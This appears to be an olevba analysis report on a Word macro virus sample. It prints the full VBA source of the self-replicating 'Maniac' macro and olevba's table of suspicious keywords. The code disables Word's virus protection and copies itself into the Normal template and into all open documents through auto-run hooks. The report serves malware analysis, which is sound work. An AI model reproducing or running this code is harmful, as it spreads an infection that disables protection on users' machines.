olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Goodday.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Goodday.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Maniac.bas 
in file: Virus.MSWord.Goodday.c - OLE stream: 'Macros/VBA/Maniac'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "宏在 99-05-05 由 Administrator 创建"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
  
  MacroCopy "open"
  
End Sub
Sub AutoNew()

  MacroCopy "new"
  
End Sub
Sub AutoClose()

  MacroCopy "close"
  
End Sub

Sub MacroCopy(ctype)
    
  Application.Options.VirusProtection = False
  
  TExist = 0
  'For Each xItem In NormalTemplate.VBProject.VBComponents
  For Each xitem In NormalTemplate.VBProject.VBComponents
    'If xitem.Type = vbext_ct_StdModule Then Count = Count + 1
    If xitem.Name = "Maniac" Then TExist = 1
  Next xitem
  If TExist = 0 Then _
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Maniac", Object:=wdOrganizerObjectProjectItems
    
  For Each openDoc In Documents
    'MsgBox openDoc.FullName
    DExist = 0
    For Each xitem In openDoc.VBProject.VBComponents
      If xitem.Name = "Maniac" Then DExist = 1
    Next xitem
    If DExist = 0 Then
      Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=openDoc.FullName, Name:="Maniac", Object:=wdOrganizerObjectProjectItems
      If ctype = "open" Then openDoc.Save
    End If
  Next openDoc
   
End Sub

Sub AutoExec()
  
  msg = Chr(13) + Chr(13)
  msg = msg + Application.UserName + ":" + Chr(13) & Chr(13)
  msg = msg + "    你好，很高兴来到你的计算机，我喜欢" + Chr(13) + Chr(13)
  msg = msg + "这里的一切，尤其是Microsoft Word，它使" + Chr(13) + Chr(13)
  msg = msg + "我们的工作变得异常有趣。" + Chr(13) + Chr(13)
  msg = msg + "    如果我的到来改变了你单调的生活，请" + Chr(13) + Chr(13)
  msg = msg + "不要介意。" + Chr(13) + Chr(13)
  msg = msg + "    愿计算机前的你心情愉快。" + Chr(13) + Chr(13) + Chr(13)
  msg = msg + "         Maniac write by " + Date$ + "         "
  MsgBox msg, vbInformation, "Maniac 1.0"
  
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

